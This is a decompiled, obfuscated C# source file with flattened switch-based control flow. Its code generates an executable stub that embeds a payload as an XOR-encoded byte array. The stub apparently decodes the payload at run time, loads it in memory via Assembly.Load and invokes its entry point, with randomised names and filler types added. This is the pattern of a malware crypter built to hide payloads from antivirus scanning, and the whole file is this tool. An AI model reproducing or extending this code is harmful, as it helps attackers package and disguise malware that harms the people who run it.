using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

public class Class9
{
	internal static readonly Random random_0 = new Random();

	internal static readonly Type[] type_0 = new Type[10]
	{
		typeof(void),
		typeof(int),
		typeof(uint),
		typeof(long),
		typeof(ulong),
		typeof(short),
		typeof(ushort),
		typeof(float),
		typeof(double),
		typeof(bool)
	};

	private static void smethod_0(ILGenerator ilgenerator_0, byte[] byte_0)
	{
		byte b = (byte)random_0.Next(1, 256);
		StringBuilder stringBuilder = default(StringBuilder);
		int num4 = default(int);
		LocalBuilder localBuilder_2 = default(LocalBuilder);
		LocalBuilder localBuilder_3 = default(LocalBuilder);
		LocalBuilder local = default(LocalBuilder);
		Label label2 = default(Label);
		LocalBuilder localBuilder_ = default(LocalBuilder);
		Label label = default(Label);
		string str = default(string);
		int num3 = default(int);
		while (true)
		{
			int num = 12825994;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ 0x2F49056)) % 45)
				{
				case 44u:
					stringBuilder = new StringBuilder(byte_0.Length);
					num4 = 0;
					num = (int)((num2 * 108601941) ^ 0x8AEEDCA);
					continue;
				case 43u:
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = 657439388;
					continue;
				case 42u:
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					num = (int)((num2 * 1320485824) ^ 0xAFC787C);
					continue;
				case 41u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_S, b);
					num = ((int)num2 * -1758726288) ^ 0x4F2AE931;
					continue;
				case 40u:
					ilgenerator_0.Emit(OpCodes.Blt_S, label2);
					smethod_1(ilgenerator_0, localBuilder_3);
					ilgenerator_0.Emit(OpCodes.Call, ((Class9)(object)typeof(Assembly)).method_1(Class178.smethod_0(54), new Type[1] { typeof(byte[]) }));
					num = (int)((num2 * 260118331) ^ 0x149C39D7);
					continue;
				case 39u:
					ilgenerator_0.Emit(OpCodes.Xor);
					ilgenerator_0.Emit(OpCodes.Conv_U1);
					num = (int)(num2 * 1771177155) ^ -34596981;
					continue;
				case 38u:
					smethod_1(ilgenerator_0, localBuilder_);
					smethod_1(ilgenerator_0, localBuilder_2);
					num = ((int)num2 * -480983064) ^ 0x584BABA6;
					continue;
				case 37u:
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					num = 968996459;
					continue;
				case 36u:
					smethod_1(ilgenerator_0, localBuilder_);
					ilgenerator_0.Emit(OpCodes.Callvirt, ((Class9)(object)typeof(string)).method_0(Class178.smethod_0(41)));
					num = (int)((num2 * 1313657541) ^ 0x2BE1BF3D);
					continue;
				case 35u:
					ilgenerator_0.Emit(OpCodes.Ldloc, local);
					ilgenerator_0.Emit(OpCodes.Callvirt, ((Class9)(object)typeof(MethodBase)).method_1(Class178.smethod_0(84), new Type[2]
					{
						typeof(object),
						typeof(object[])
					}));
					ilgenerator_0.Emit(OpCodes.Pop);
					num = ((int)num2 * -1453873113) ^ -1340856405;
					continue;
				case 34u:
					label = ilgenerator_0.DefineLabel();
					num = 889515582;
					continue;
				case 33u:
					ilgenerator_0.Emit(OpCodes.Ldarg_0);
					ilgenerator_0.Emit(OpCodes.Stelem_Ref);
					num = (int)((num2 * 1540070323) ^ 0x614ABFE4);
					continue;
				case 32u:
					num = (int)((num2 * 1026115448) ^ 0x435CECA);
					continue;
				case 31u:
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = ((int)num2 * -2039841948) ^ 0x52739E9E;
					continue;
				case 30u:
					label2 = ilgenerator_0.DefineLabel();
					num = (int)((num2 * 2073120396) ^ 0xC96CB64);
					continue;
				case 29u:
					ilgenerator_0.Emit(OpCodes.Stelem_I1);
					num = ((int)num2 * -296279304) ^ 0x3D45CA79;
					continue;
				case 28u:
					stringBuilder.Append((char)(byte_0[num4] ^ b));
					num4++;
					num = 564271511;
					continue;
				case 27u:
					num = ((int)num2 * -1849074015) ^ -1622128633;
					continue;
				case 26u:
					smethod_1(ilgenerator_0, localBuilder_2);
					num = (int)(num2 * 972965044) ^ -1801248430;
					continue;
				case 25u:
					smethod_2(ilgenerator_0, localBuilder_2);
					num = (int)((num2 * 352871309) ^ 0x6C442947);
					continue;
				case 24u:
					localBuilder_2 = ilgenerator_0.DeclareLocal(typeof(string));
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					num = ((int)num2 * -1363483588) ^ 0x6ED4B37E;
					continue;
				case 23u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
					num = ((int)num2 * -1891963387) ^ 0x4E6F0ADB;
					continue;
				case 22u:
					smethod_1(ilgenerator_0, localBuilder_3);
					smethod_1(ilgenerator_0, localBuilder_);
					num = ((int)num2 * -52615976) ^ 0x172F2A7C;
					continue;
				case 21u:
					ilgenerator_0.Emit(OpCodes.Ldstr, str);
					num = (int)((num2 * 214714123) ^ 0x431BB6F2);
					continue;
				case 20u:
					ilgenerator_0.Emit(OpCodes.Callvirt, ((Class9)(object)typeof(Assembly)).method_0(Class178.smethod_0(63)));
					ilgenerator_0.Emit(OpCodes.Ldnull);
					ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
					num = ((int)num2 * -628378115) ^ -1785105557;
					continue;
				case 19u:
				{
					int num8;
					int num9;
					if (num3 != 0)
					{
						num8 = -326491273;
						num9 = -326491273;
					}
					else
					{
						num8 = -1296326619;
						num9 = -1296326619;
					}
					num = num8 ^ (int)(num2 * 193936135);
					continue;
				}
				case 17u:
					localBuilder_3 = ilgenerator_0.DeclareLocal(typeof(byte[]));
					num = ((int)num2 * -314521797) ^ -1249708411;
					continue;
				case 16u:
					ilgenerator_0.Emit(OpCodes.Callvirt, ((Class9)(object)typeof(string)).method_0(Class178.smethod_0(24)));
					ilgenerator_0.Emit(OpCodes.Newarr, typeof(byte));
					num = (int)((num2 * 1618865506) ^ 0x112A75D1);
					continue;
				case 15u:
				{
					int num6;
					int num7;
					if (num3 == 1)
					{
						num6 = -667227682;
						num7 = -667227682;
					}
					else
					{
						num6 = -502026177;
						num7 = -502026177;
					}
					num = num6 ^ ((int)num2 * -1389907477);
					continue;
				}
				case 14u:
					ilgenerator_0.Emit(OpCodes.Ldc_I4_1);
					num = (int)((num2 * 1489033811) ^ 0x733FE2BE);
					continue;
				case 13u:
					smethod_1(ilgenerator_0, localBuilder_2);
					num = ((int)num2 * -2128976736) ^ -1616035068;
					continue;
				case 12u:
					ilgenerator_0.Emit(OpCodes.Newarr, typeof(object));
					ilgenerator_0.Emit(OpCodes.Stloc, local);
					ilgenerator_0.Emit(OpCodes.Ldloc, local);
					num = (int)((num2 * 971735712) ^ 0x6D43F1BE);
					continue;
				case 11u:
					smethod_2(ilgenerator_0, localBuilder_);
					ilgenerator_0.MarkLabel(label);
					num = (int)((num2 * 1369625518) ^ 0x2D87D373);
					continue;
				case 9u:
					local = ilgenerator_0.DeclareLocal(typeof(object[]));
					num = 1264608582;
					continue;
				case 8u:
					ilgenerator_0.Emit(OpCodes.Br_S, label);
					ilgenerator_0.MarkLabel(label2);
					num = ((int)num2 * -1799320126) ^ -126316275;
					continue;
				case 7u:
					num = (int)((num2 * 271334085) ^ 0x30388918);
					continue;
				case 6u:
					smethod_2(ilgenerator_0, localBuilder_3);
					ilgenerator_0.Emit(OpCodes.Ldc_I4_0);
					smethod_2(ilgenerator_0, localBuilder_);
					num = ((int)num2 * -1604502922) ^ -1456859302;
					continue;
				case 5u:
					localBuilder_ = ilgenerator_0.DeclareLocal(typeof(int));
					num = ((int)num2 * -487663471) ^ 0x79252920;
					continue;
				case 4u:
					ilgenerator_0.Emit(OpCodes.Callvirt, ((Class9)(object)typeof(string)).method_0(Class178.smethod_0(24)));
					num = (int)(num2 * 1644388550) ^ -336213653;
					continue;
				case 3u:
					ilgenerator_0.Emit(OpCodes.Add);
					num = ((int)num2 * -508239057) ^ -946983559;
					continue;
				case 2u:
					smethod_1(ilgenerator_0, localBuilder_);
					num = (int)((num2 * 820501949) ^ 0x1FB6C4D4);
					continue;
				case 1u:
				{
					int num5;
					if (num4 >= byte_0.Length)
					{
						num = 1642015953;
						num5 = 1642015953;
					}
					else
					{
						num = 2071486505;
						num5 = 2071486505;
					}
					continue;
				}
				case 0u:
					str = stringBuilder.ToString();
					num3 = random_0.Next(3);
					num = (int)((num2 * 1030772802) ^ 0x38ACFA48);
					continue;
				case 10u:
					break;
				default:
					ilgenerator_0.Emit(OpCodes.Ret);
					return;
				}
				break;
			}
		}
	}

	private static void smethod_1(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			goto IL_0093;
		}
		goto IL_0122;
		IL_0093:
		int num = 859101067;
		goto IL_00cd;
		IL_00cd:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)(num ^ 0x49D682DE)) % 13)
			{
			case 12u:
				ilgenerator_0.Emit(OpCodes.Ldloc_0);
				num = ((int)num2 * -1523914887) ^ 0x3481DFA4;
				continue;
			case 9u:
				ilgenerator_0.Emit(OpCodes.Ldloc_3);
				num = ((int)num2 * -1178763403) ^ 0x4BA34694;
				continue;
			case 8u:
				break;
			case 4u:
				ilgenerator_0.Emit(OpCodes.Ldloc_2);
				num = ((int)num2 * -1453643623) ^ 0xC86B21F;
				continue;
			case 3u:
				goto end_IL_00cd;
			case 1u:
				ilgenerator_0.Emit(OpCodes.Ldloc, localBuilder_0);
				num = 398576207;
				continue;
			case 0u:
				goto IL_00ad;
			default:
				return;
			case 2u:
				goto IL_0122;
			case 5u:
				ilgenerator_0.Emit(OpCodes.Ldloc_1);
				return;
			case 6u:
				return;
			case 7u:
				return;
			case 10u:
				return;
			case 11u:
				return;
			}
			int num3;
			if (localBuilder_0.LocalIndex != 2)
			{
				num = 327609336;
				num3 = 327609336;
			}
			else
			{
				num = 449455723;
				num3 = 449455723;
			}
			continue;
			IL_00ad:
			int num4;
			if (localBuilder_0.LocalIndex == 3)
			{
				num = 1789880780;
				num4 = 1789880780;
			}
			else
			{
				num = 1041031066;
				num4 = 1041031066;
			}
			continue;
			end_IL_00cd:
			break;
		}
		goto IL_0093;
		IL_0122:
		int num5;
		if (localBuilder_0.LocalIndex != 1)
		{
			num = 2142120133;
			num5 = 2142120133;
		}
		else
		{
			num = 1616290302;
			num5 = 1616290302;
		}
		goto IL_00cd;
	}

	private static void smethod_2(this ILGenerator ilgenerator_0, LocalBuilder localBuilder_0)
	{
		if (localBuilder_0.LocalIndex == 0)
		{
			goto IL_0033;
		}
		goto IL_0143;
		IL_0033:
		int num = -1938115738;
		goto IL_00ea;
		IL_00ea:
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)(num ^ -473361677)) % 14)
			{
			case 13u:
				ilgenerator_0.Emit(OpCodes.Stloc, localBuilder_0);
				num = -2059354248;
				continue;
			case 12u:
				break;
			case 9u:
				ilgenerator_0.Emit(OpCodes.Stloc_0);
				num = ((int)num2 * -2139582503) ^ -1820880046;
				continue;
			case 8u:
				ilgenerator_0.Emit(OpCodes.Stloc_2);
				num = (int)((num2 * 1459890431) ^ 0x395241F2);
				continue;
			case 5u:
				goto IL_0074;
			case 2u:
				ilgenerator_0.Emit(OpCodes.Stloc_1);
				num = ((int)num2 * -407741664) ^ 0x6D199F37;
				continue;
			case 1u:
				ilgenerator_0.Emit(OpCodes.Stloc_3);
				num = (int)((num2 * 82007744) ^ 0x78398D1B);
				continue;
			case 0u:
				goto IL_00ca;
			default:
				return;
			case 7u:
				goto IL_0143;
			case 3u:
				return;
			case 4u:
				return;
			case 6u:
				return;
			case 10u:
				return;
			case 11u:
				return;
			}
			break;
			IL_00ca:
			int num3;
			if (localBuilder_0.LocalIndex == 2)
			{
				num = -1276922383;
				num3 = -1276922383;
			}
			else
			{
				num = -1185797146;
				num3 = -1185797146;
			}
			continue;
			IL_0074:
			int num4;
			if (localBuilder_0.LocalIndex != 3)
			{
				num = -578414888;
				num4 = -578414888;
			}
			else
			{
				num = -1109401586;
				num4 = -1109401586;
			}
		}
		goto IL_0033;
		IL_0143:
		int num5;
		if (localBuilder_0.LocalIndex != 1)
		{
			num = -331981041;
			num5 = -331981041;
		}
		else
		{
			num = -1596905633;
			num5 = -1596905633;
		}
		goto IL_00ea;
	}

	public static void smethod_3(byte[] byte_0, string string_0, PEFileKinds pefileKinds_0)
	{
		AssemblyName assemblyName = new AssemblyName(Class171.smethod_417());
		MethodBuilder methodBuilder = default(MethodBuilder);
		TypeBuilder typeBuilder = default(TypeBuilder);
		ModuleBuilder moduleBuilder_ = default(ModuleBuilder);
		int num4 = default(int);
		AssemblyBuilder assemblyBuilder = default(AssemblyBuilder);
		int num3 = default(int);
		int num6 = default(int);
		while (true)
		{
			int num = -2073128078;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)(num ^ -114191713)) % 15)
				{
				case 14u:
					methodBuilder = typeBuilder.DefineMethod(Class171.smethod_417(), MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[1] { typeof(string[]) });
					num = ((int)num2 * -2024129385) ^ -896303510;
					continue;
				case 13u:
					typeBuilder = Class171.smethod_5(moduleBuilder_);
					num = -1238872512;
					continue;
				case 12u:
					num4 = random_0.Next(5, 30);
					num = ((int)num2 * -1985160637) ^ 0x2EFF1BAD;
					continue;
				case 11u:
					assemblyBuilder.Save(assemblyName.Name + Class178.smethod_0(93));
					num = (int)((num2 * 121472233) ^ 0x11984D8B);
					continue;
				case 9u:
					methodBuilder = null;
					num3 = 0;
					num = ((int)num2 * -31959614) ^ -4543026;
					continue;
				case 8u:
					assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Save);
					moduleBuilder_ = assemblyBuilder.DefineDynamicModule(assemblyName.Name, assemblyName.Name + Class178.smethod_0(93));
					num = (int)(num2 * 752845250) ^ -1900708857;
					continue;
				case 7u:
				{
					int num7;
					int num8;
					if (num6 == num3)
					{
						num7 = 616265467;
						num8 = 616265467;
					}
					else
					{
						num7 = 813512902;
						num8 = 813512902;
					}
					num = num7 ^ ((int)num2 * -2088486494);
					continue;
				}
				case 5u:
					num6 = random_0.Next(num4);
					num = ((int)num2 * -485642617) ^ 0x143C2F59;
					continue;
				case 4u:
					assemblyBuilder.SetEntryPoint(methodBuilder, pefileKinds_0);
					num = (int)((num2 * 1006761686) ^ 0x7DFA997C);
					continue;
				case 3u:
					smethod_0(methodBuilder.GetILGenerator(), byte_0);
					num = ((int)num2 * -1995184935) ^ -958910331;
					continue;
				case 2u:
					typeBuilder.CreateType();
					num3++;
					num = -368763878;
					continue;
				case 1u:
				{
					int num5;
					if (num3 < num4)
					{
						num = -298444825;
						num5 = -298444825;
					}
					else
					{
						num = -1885986926;
						num5 = -1885986926;
					}
					continue;
				}
				case 0u:
					methodBuilder.SetCustomAttribute(new CustomAttributeBuilder(((Class9)(object)typeof(STAThreadAttribute)).method_2(new Type[0]), new object[0]));
					num = ((int)num2 * -1461787974) ^ 0x28B1ED82;
					continue;
				case 10u:
					break;
				default:
					File.Move(assemblyName.Name + Class178.smethod_0(93), string_0);
					return;
				}
				break;
			}
		}
	}

	MethodInfo method_0(string string_0)
	{
		return ((Type)this).GetMethod(string_0);
	}

	MethodInfo method_1(string string_0, Type[] type_1)
	{
		return ((Type)this).GetMethod(string_0, type_1);
	}

	ConstructorInfo method_2(Type[] type_1)
	{
		return ((Type)this).GetConstructor(type_1);
	}
}
